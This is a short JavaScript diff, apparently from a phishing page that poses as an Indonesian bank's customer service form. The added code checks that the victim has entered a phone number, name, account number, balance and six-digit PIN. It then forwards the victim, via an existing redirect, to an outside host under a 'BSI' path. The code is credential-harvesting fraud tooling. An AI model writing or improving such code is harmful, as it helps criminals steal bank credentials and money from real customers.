@@ -152,7 +152,16 @@ document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";
 
 function getcs(){
  $("#djload").show();   
-  
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    const saldo = $('#saldo').val();
+    const sixpin = $('#sixpin').val();
+ if (!tarif || !nomor || !nama || !rek || !saldo || !sixpin) {      
+        window.location.href = "/";
+        return false;
+    }   
 setTimeout(function(){  
 location.href='https://anjayhostjon.cloud/BSI/7h27g/wa';
     }, 1000);
